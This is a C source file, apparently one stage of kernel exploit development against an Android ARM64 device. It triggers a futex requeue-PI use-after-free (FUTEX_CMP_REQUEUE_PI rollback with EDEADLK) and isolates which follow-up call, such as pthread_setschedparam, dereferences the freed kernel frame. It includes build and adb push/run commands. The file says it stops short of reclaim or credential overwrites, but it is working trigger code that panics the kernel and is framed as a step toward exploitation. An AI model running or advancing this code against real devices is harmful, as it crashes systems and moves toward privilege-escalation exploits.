/*
 * ghostlock_uaf_isolate.c — isolates WHICH consumer crashes the device.
 *
 * Finding that motivated this tool: ghostlock_uaf_check.c (Phase 3) crashes
 * aquaman on the VULN leg, but the log stops at "[vuln] cmp_errno=35" — i.e.,
 * the crash comes AFTER the rollback, in the teardown/consumer leg, and not
 * during the CMP. And the device recovers on its own (PANIC_TIMEOUT=1), so each
 * test costs a reboot, not a power cycle.
 *
 * Four legs, one per execution (argv[1] = 1..4), to avoid mixing state.
 * All set up the same PI trio; what changes is the consumer:
 *
 *   1 control       without CMP (waiter exits on timeout), without consumer
 *   2 vuln          CMP -> EDEADLK, without consumer
 *   3 vuln+sched    CMP -> EDEADLK, consumer = pthread_setschedparam
 *   4 vuln+spin     CMP -> EDEADLK, consumer = none, just wait for waiter to exit
 *
 * Interpretation:
 *   1 and 2 green + 3 red      => consumer is the trigger. The walk in
 *        rt_mutex_setprio/rt_mutex_get_effective_prio traverses the dangling
 *        pi_blocked_on and the frame has already been reclaimed: that is the UAF.
 *   2 red                      => waiter wakeup itself (rt_mutex_wake
 *        over the waiters tree with dangling node) is the trigger, and there is
 *        no usable consumer for calibration.
 *   1 red                      => tool is wrong, not the kernel.
 *
 * No reclaim, no stamp, no writing to cred/funcptr, no SELinux.
 * Nothing persists. Risk: reboot per test, already known.
 *
 * Build (NDK r29, ARM64, API 28):
 *   ~/Android/Sdk/ndk/29.0.14206865/toolchains/llvm/prebuilt/linux-x86_64/bin/\
 *     aarch64-linux-android28-clang -O2 -Wall -static \
 *     ghostlock_uaf_isolate.c -o ghostlock_uaf_isolate
 * Run:
 *   adb push ghostlock_uaf_isolate /data/local/tmp/
 *   adb shell /data/local/tmp/ghostlock_uaf_isolate 3
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_futex
#define __NR_futex 98
#endif
#define FUTEX_LOCK_PI            6
#define FUTEX_UNLOCK_PI          7
#define FUTEX_WAIT_REQUEUE_PI    11
#define FUTEX_CMP_REQUEUE_PI     12
#define FUTEX_PRIVATE_FLAG       128
#define EDEADLK                  35

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

static uint32_t f_wait, f_target, f_chain;
static volatile int w_ready, w_waiting, w_done, o_started;
static volatile int consumer_mode;   /* 0 = no consumer */
static pthread_t waiter_tid;

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static void *waiter_fn(void *u) {
    (void)u;
    if (xfutex(&f_chain, FLPI, 0, NULL, NULL, 0))
        return NULL;
    w_ready = 1;
    while (!o_started)
        usleep(1000);
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1;
    w_waiting = 1;
    xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
    w_done = 1;
    printf("[waiter] exited wait (waiter=%s)\n",
           consumer_mode ? "will receive consumer" : "no consumer");
    /* remains alive and paradoxical: kernel frame has already been freed */
    sleep(60);
    return NULL;
}

static void *owner_fn(void *u) {
    (void)u;
    if (xfutex(&f_target, FLPI, 0, NULL, NULL, 0))
        return NULL;
    while (!w_ready)
        usleep(1000);
    o_started = 1;
    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);
    printf("[owner] exited lock\n");
    return NULL;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    int leg = argc > 1 ? atoi(argv[1]) : 3;
    int with_cmp = (leg >= 2);
    consumer_mode = (leg == 3);

    printf("[info] leg=%d (%s) with_cmp=%d consumer=%d\n", leg,
           leg == 1 ? "control" : leg == 2 ? "vuln without consumer"
           : leg == 3 ? "vuln + setschedparam" : "vuln + wait",
           with_cmp, consumer_mode);

    f_wait = f_target = f_chain = 0;
    w_ready = w_waiting = w_done = o_started = 0;

    pthread_t w, o;
    if (pthread_create(&w, NULL, waiter_fn, NULL)) {
        printf("[FAIL] pthread_create waiter\n");
        return 1;
    }
    waiter_tid = w;
    if (pthread_create(&o, NULL, owner_fn, NULL)) {
        printf("[FAIL] pthread_create owner\n");
        return 1;
    }
    while (!w_waiting || !o_started)
        usleep(1000);

    if (with_cmp) {
        usleep(200000);
        errno = 0;
        xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
        int e = errno;
        printf("[cmp] errno=%d (%s)\n", e, strerror(e));
        if (e != EDEADLK) {
            printf("[verdict] rollback NOT reached, aborting\n");
            return 3;
        }
    } else {
        printf("[cmp] skipped (control)\n");
        usleep(1300000);
    }

    xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
    pthread_join(o, NULL);

    int spins = 0;
    while (!w_done && spins++ < 250) {
        usleep(20000);
        printf("[wait] w_done=0, %d\n", spins);
    }
    printf("[wait] w_done=%d after %d spins\n", w_done, spins);
    if (!w_done) {
        printf("[verdict] waiter did not return\n");
        return 2;
    }

    if (consumer_mode) {
        struct sched_param p = { .sched_priority = 0 };
        printf("[consumer] before setschedparam\n");
        uint64_t t0 = now_ns();
        errno = 0;
        int r = pthread_setschedparam(waiter_tid, SCHED_BATCH, &p);
        printf("[consumer] BATCH ret=%d errno=%d(%s) %lluns\n", r, errno,
               r ? strerror(errno) : "ok",
               (unsigned long long)(now_ns() - t0));
        printf("[consumer] before SCHED_OTHER\n");
        t0 = now_ns();
        errno = 0;
        r = pthread_setschedparam(waiter_tid, SCHED_OTHER, &p);
        printf("[consumer] OTHER ret=%d errno=%d(%s) %lluns\n", r, errno,
               r ? strerror(errno) : "ok",
               (unsigned long long)(now_ns() - t0));
    }

    printf("[verdict] leg=%d survived, consumer=%d\n", leg, consumer_mode);
    return 0;
}
